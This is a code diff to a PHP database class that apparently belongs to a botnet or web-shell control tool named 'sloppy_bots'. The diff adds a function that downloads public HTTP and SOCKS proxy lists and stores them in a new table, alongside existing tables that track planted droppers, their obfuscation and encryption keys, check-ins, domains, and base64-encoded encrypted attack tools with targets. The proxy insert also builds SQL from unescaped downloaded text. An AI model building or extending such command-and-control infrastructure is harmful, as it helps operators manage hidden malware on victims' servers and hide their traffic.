@@ -12,6 +12,52 @@ class postgres_checker
 
     }
 
+    function getProxies(string $doAction){
+        $dx = curl_init();
+        $proxy_types = array(
+            "http",
+            "socks4",
+            "socks5"
+        );
+        if ($doAction === "initial") {
+            $outWrite = file(getcwd() . "/includes/config/sloppy_config.ini");
+            $tt = fopen(getcwd() . '/includes/config/sloppy_config.ini', "w");
+            $outWrite[10] = "proxy_init=true\n";
+            foreach ($outWrite as $val) {
+                fwrite($tt, $val);
+            }
+            fclose($tt);
+            foreach ($proxy_types as $prox) {
+                curl_setopt($dx, CURLOPT_URL, "https://api.proxyscrape.com/?request=getproxies&proxytype={$prox}&timeout=10000&country=all&ssl=all&anonymity=all");
+                curl_setopt($dx, CURLOPT_TIMEOUT, 15);
+                curl_setopt($dx, CURLOPT_CONNECTTIMEOUT, 15);
+                curl_setopt($dx, CURLOPT_RETURNTRANSFER, true);
+                $rt_pr = curl_exec($dx);
+                if (!curl_errno($dx)) {
+                    switch (curl_getinfo($dx, CURLINFO_HTTP_CODE)) {
+                        case 200:
+                            unlink($prox);
+                            file_put_contents($prox, $rt_pr);
+                            foreach (file($prox) as $prValue) {
+                                $ex = $prox . "://" . $prValue;
+                                pg_exec($this->init_conn(), sprintf("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES ('%s', '%s')",
+                                    $prox,
+                                    trim($ex),
+                                ));
+                            }
+                            break;
+                        default:
+                            echo "Appears as though the server has blocked us." . PHP_EOL;
+                            break;
+                    }
+                }
+            }
+        }else{
+            echo "Still building.".PHP_EOL;
+        }
+        curl_close($dx);
+    }
+
     function createDB()
     {
         $sloppy_ini = parse_ini_file(getcwd() . "/includes/config/sloppy_config.ini", true);
@@ -32,6 +78,7 @@ class postgres_checker
                 pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id SERIAL NOT NULL constraint sloppy_bots_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT NOT NULL UNIQUE, depth TEXT NOT NULL, obfuscated TEXT NOT NULL default 'false', check_in INTEGER NOT NULL default 0, chachakey TEXT UNIQUE NOT NULL DEFAULT '-', aeskeys TEXT UNIQUE NOT NULL DEFAULT '-', xorkey TEXT NOT NULL UNIQUE DEFAULT '-')");
                 pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_domains(id SERIAL NOT NULL constraint sloppy_bots_domains_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, uses INTEGER NOT NULL DEFAULT 0, domain TEXT UNIQUE NOT NULL DEFAULT '-')");
                 pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id SERIAL NOT NULL constraint sloppy_bots_tools_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, tool_name TEXT UNIQUE NOT NULL DEFAULT '-', target TEXT NOT NULL DEFAULT '-', base64_encoded_tool TEXT UNIQUE NOT NULL DEFAULT '-', keys TEXT UNIQUE DEFAULT '-', tags TEXT UNIQUE DEFAULT '-', iv TEXT UNIQUE DEFAULT '-', aad TEXT DEFAULT '-',cipher TEXT DEFAULT '-', hmac_hash TEXT UNIQUE DEFAULT '-', lang TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false)");
+                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_proxies(id SERIAL NOT NULL constraint sloppy_bots_proxies_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, proxy_schema TEXT NOT NULL DEFAULT '-', proxy TEXT UNIQUE NOT NULL DEFAULT '-', times_used INTEGER NOT NULL DEFAULT 0, last_domain_contacted TEXT NOT NULL DEFAULT '-', proxy_still_viable BOOLEAN NOT NULL DEFAULT TRUE, round_trip_time INTEGER NOT NULL DEFAULT 0)");
                 pg_exec($this->init_conn(), "GRANT SELECT,INSERT,UPDATE ON sloppy_bots_main,sloppy_bots_droppers,sloppy_bots_domains,sloppy_bots_tools TO sloppy_bot");
                 pg_exec($this->init_conn(), "GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO sloppy_bot");
                 // calling this commit to ensure the transaction succeeds, even though we have set autocommit to on.
